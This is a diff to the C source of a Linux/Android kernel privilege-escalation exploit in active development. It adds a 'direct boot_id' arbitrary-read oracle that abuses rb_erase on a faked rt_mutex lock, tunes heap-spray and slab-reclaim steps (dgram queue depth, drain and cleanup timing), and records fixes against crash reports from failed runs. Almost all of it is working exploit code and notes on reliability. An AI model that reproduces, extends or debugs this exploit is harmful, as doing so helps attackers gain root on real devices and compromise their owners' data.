@@ -49,6 +49,7 @@ uintptr_t binwrite_target;
 uintptr_t slide_p0_offset;
 uintptr_t slide_oracle_parent;
 uintptr_t slide_oracle_target;
+uintptr_t slide_oracle_child;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
@@ -117,6 +118,54 @@ int select_slide_payload_index(size_t index) {
   if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
     return 0;
   }
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (getenv("DIRECT_BOOTID_RECLAIM")) {
+    /* Direct-boot_id design (port of popsicle/OnePlus direct-root): the
+     * waiter task is the REAL, DYING-BUT-STABLE init_task (KASLR-computable,
+     * never dereferenced — rt_mutex_owner() is compare-only), so the ONLY
+     * object that must be reclaimed is fake_lock.  The rb_erase target is
+     * the boot_id sysctl ctl_table entry (KASLR-computable), giving an
+     * arbitrary-read oracle via /proc/sys/kernel/random/boot_id.  This is
+     * strictly less reclaim than the FAKE_TASK path (2 objects -> 1). */
+    fake_task = SLIDE_INIT_TASK + slide_p0_offset;
+    fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
+                index * SLIDE_BANK_SLOT_STRIDE;
+    fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
+
+    /* target = &ctl_table.data for the boot_id sysctl (KASLR-computable).
+     * Leafless mode (default): the rb_erase writes 0 into parent's child
+     * slot, which only redirects boot_id to a stack tmp_uuid (run 29/30).
+     * CHILD mode (DIRECT_BOOTID_CHILD=1): the waiter is given one child so
+     * rb_erase takes the `str x9(child), [parent_child_slot]` path and plants
+     * the CONTROLLED child pointer into &ctl_table.data.  parent is set to
+     * target-0x10 so parent->rb_left aliases &ctl_table.data, and the child
+     * (= DIRECT_BOOTID_ADDR Q, default nfulnl_logger) is the value written.
+     * boot_id then reads the 16 bytes at Q = a true arbitrary read, still on
+     * the SAME reliable 1-object fake_lock reclaim. */
+    slide_oracle_target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
+                          slide_p0_offset;
+    uintptr_t q = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    const char *addr_arg = getenv("DIRECT_BOOTID_ADDR");
+    if (addr_arg && *addr_arg) {
+      char *end = NULL;
+      errno = 0;
+      unsigned long long v = strtoull(addr_arg, &end, 0);
+      if (!errno && end != addr_arg && !*end && !(v & 7)) {
+        q = (uintptr_t)v;
+      }
+    }
+    if (getenv("DIRECT_BOOTID_CHILD")) {
+      /* parent = ctl_table.data - 0x10 -> parent->rb_left == &ctl_table.data.
+       * Waiter must be parent's LEFT child and have one child = Q. */
+      slide_oracle_parent = slide_oracle_target - 0x10;
+      slide_oracle_child = q;
+    } else {
+      slide_oracle_parent = slide_oracle_target;
+      slide_oracle_child = 0;
+    }
+    return 1;
+  }
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (getenv("COMPACT_PAYLOAD") || getenv("DGRAM_RECLAIM")) {
     /* Compact 4 KB payload (fix #22/#26): task/lock/waiter/marker all
@@ -618,15 +667,35 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
        * 0x9C0-0xA18, marker 0xA20.  Nothing below +0x40 is referenced,
        * so the image also survives a dgram skb head's +0x22 reserve.
        * Only the gate slot is supported. */
-      uintptr_t parent = direct_to_page(base);
+      /* Fix #33 (compact slot parents/targets): under the compact
+       * image only slot 0 is armed, but slots 1-3 are still selectable
+       * downstream (probe/restore).  Give the non-gate slots the same
+       * contents as the legacy path so a slot-2+ trigger no longer runs
+       * with parent=target=0 (run 11/13 KP #59-style BUG at
+       * rtmutex_common.h:118 after a diagnostic gate miss). */
+      uintptr_t gate_parent = direct_to_page(base);
       if (getenv("P0_ORACLE_PARENT_PIPEBUF")) {
-        parent = direct_to_page(pipebuf_page_base);
+        gate_parent = direct_to_page(pipebuf_page_base);
       }
-      uintptr_t target = pipebuf_page_base +
-                         P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-      p0_gate_page_struct = parent;
-      slide_bank_parents[0] = parent;
-      slide_bank_targets[0] = target;
+      uintptr_t gate_target = pipebuf_page_base +
+                              P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+      uintptr_t probe_parent = direct_to_page(
+          P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET);
+      uintptr_t probe_target = pipebuf_page_base +
+                               P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+                               sizeof(struct user_pipe_buffer);
+      p0_gate_page_struct = gate_parent;
+      p0_probe_page_struct = probe_parent;
+      slide_bank_parents[P0_ORACLE_GATE_SLOT] = gate_parent;
+      slide_bank_targets[P0_ORACLE_GATE_SLOT] = gate_target;
+      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = probe_parent;
+      slide_bank_targets[P0_ORACLE_PROBE_SLOT] = probe_target;
+      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] = gate_parent;
+      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
+      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] = probe_parent;
+      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
+      uintptr_t parent = gate_parent;
+      uintptr_t target = gate_target;
       for (size_t idx = 0x1000; idx + 0x1000 <= SKB_SEND_SIZE;
            idx += 0x1000) {
         unsigned char *p = skb_buf + idx;
@@ -1233,6 +1302,32 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
   }
 
+  /* Fix #34 (ZERO_DRAIN_FREE): every fire since fix #21 (KP #55-#60)
+   * has walked the SAME third-party content (task+0x348 =
+   * 0x0001000000000000 -> owner = 0x0001000000000001 -> BUG at
+   * rtmutex_common.h:118), regardless of spray depth (fix #23),
+   * controlled dgram slab growth (fix #26), waves (fix #29) or anon
+   * faults (fix #30).  5 identical outcomes means the thief is
+   * deterministic, not a race: the 16 prepare_ctx drain kills that
+   * LATE_NEIGHBOUR_FREE runs BEFORE the neighbour closes exit their
+   * children, and each child exit frees ~2 order-3 pages (kernel stack
+   * + the mm slab page).  Those free order-3 blocks replenish the
+   * depleted kmalloc-8k partial slabs FIRST; the target slab (freed
+   * afterwards) only reaches the buddy allocator afterwards, and the
+   * very next kmalloc-8k slab growth (the dgram spray's own data
+   * allocations) grabs a freshly-grown page — which under
+   * CONFIG_SHUFFLE_PAGE_ALLOCATOR is the target block itself.  The
+   * block never reaches the dgram data: it becomes kmalloc-8k SLAB
+   * METADATA (freelist pointers + one freshly allocated dgram header,
+   * packed small ints — exactly the 0x0001... content the walk reads).
+   * With zero drains (MM_DRAIN_TRIGGERS=0) no child exits before the
+   * frees, so the target slab is the ONLY fresh order-3 block at spray
+   * time and the dgram growth must claim it (as a data-carrying slab
+   * page = our compact image).  nr_partial pressure is provided by the
+   * pre/post/spray-slab frees instead. */
+
+  int zero_drain_free = getenv("ZERO_DRAIN_FREE") != NULL;
+
   /* Fix #21 (LATE_NEIGHBOUR_FREE): KP #49 proved the target page NEVER
    * leaves the mm_struct cache — the neighbours freed first (fix #19/#20)
    * empty the slab while the per-node partial count is still low, so the
@@ -1247,6 +1342,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * page goes straight to the buddy allocator, where the immediate skb
    * spray below can claim it. */
   int late_neighbour_free = getenv("LATE_NEIGHBOUR_FREE") != NULL;
+  if (zero_drain_free) {
+    /* Fix #34: no pre-free drains — see the block comment above. */
+    late_neighbour_free = 0;
+    drain_triggers = 0;
+  }
   if (late_neighbour_free) {
     for (size_t i = 0; i < drain_triggers; i++) {
       size_t index = i * mm_objs_per_slab;
@@ -1383,7 +1483,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       /* ~4.7 KB truesize per dgram: an 8 MB buffer holds ~1700, far
        * beyond the 256 stream cap — raise the per-socket dgram limit;
        * ENOBUFS is the real stop. */
-      for (int i = 0; i < reclaim_sends * 8; i++) {
+      long dgram_target = reclaim_sends * 8;
+      /* Fix #32 (DGRAM_QLEN): run 11/12 showed the per-socket dgram
+       * count capping at ~224-240 (~1 MB) despite an 8 MB SNDBUF — the
+       * device's max_dgram_qlen=2400 does not bind that low, so the cap
+       * is the qdisc limit, not the buffer.  Allow a deeper per-socket
+       * spray via env; the loop still stops at ENOBUFS/EAGAIN. */
+      const char *qlen_env = getenv("DGRAM_QLEN");
+      if (qlen_env && *qlen_env) {
+        char *end = NULL;
+        errno = 0;
+        long value = strtol(qlen_env, &end, 0);
+        if (!errno && end != qlen_env && !*end && value >= 1 &&
+            value <= 100000) {
+          dgram_target = value;
+        }
+      }
+      for (long i = 0; i < dgram_target; i++) {
         errno = 0;
         ssize_t sent =
             sendmsg(reclaim_extra_sv[s - 1][0], &dgram_msg, MSG_DONTWAIT);
@@ -1415,16 +1531,31 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           payload_mode);
   slabinfo_diag("post-spray");
 
-  /* Deferred from before the sends (fix #20): release the rest of the
-   * prepare spray now that the reclaim frags are queued. */
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    if (prepare_ctx.memfds[i] >= 0) {
-      SYSCHK(close(prepare_ctx.memfds[i]));
-      prepare_ctx.memfds[i] = -1;
-    }
-    if (prepare_ctx.childs[i] > 0) {
-      kill_child(prepare_ctx.childs[i]);
-      prepare_ctx.childs[i] = -1;
+  /* Fix #35 (HOLD_PREPARE_CTX): KP #61 (zero-drain) proved the walk still
+   * reads a ZEROED target page, while fix #21/#34 never changed the
+   * walked content.  The common thread across ALL misses is our own
+   * self-interference AFTER the one-shot spray: the ~1000 prepare_ctx
+   * child kills below run on the exploit core right before arming, and
+   * each exit frees an order-3 kernel-stack page that the ~1700-4000
+   * queued dgram/stream frags immediately consume as slab growth — the
+   * target page is re-stolen out of our own queue before the walk.
+   * Deferring this cleanup until after the walk (the children simply
+   * outlive the attempt; the process exit reaps them) removes the
+   * largest self-inflicted order-3 free source from the critical
+   * window.  Opt-in: default keeps the old behaviour for other
+   * payload modes that rely on the freed mms. */
+  if (getenv("HOLD_PREPARE_CTX")) {
+    pr_info("prepare_ctx cleanup deferred (HOLD_PREPARE_CTX)\n");
+  } else {
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      if (prepare_ctx.memfds[i] >= 0) {
+        SYSCHK(close(prepare_ctx.memfds[i]));
+        prepare_ctx.memfds[i] = -1;
+      }
+      if (prepare_ctx.childs[i] > 0) {
+        kill_child(prepare_ctx.childs[i]);
+        prepare_ctx.childs[i] = -1;
+      }
     }
   }
   kernelsnitch_cleanup(ks);
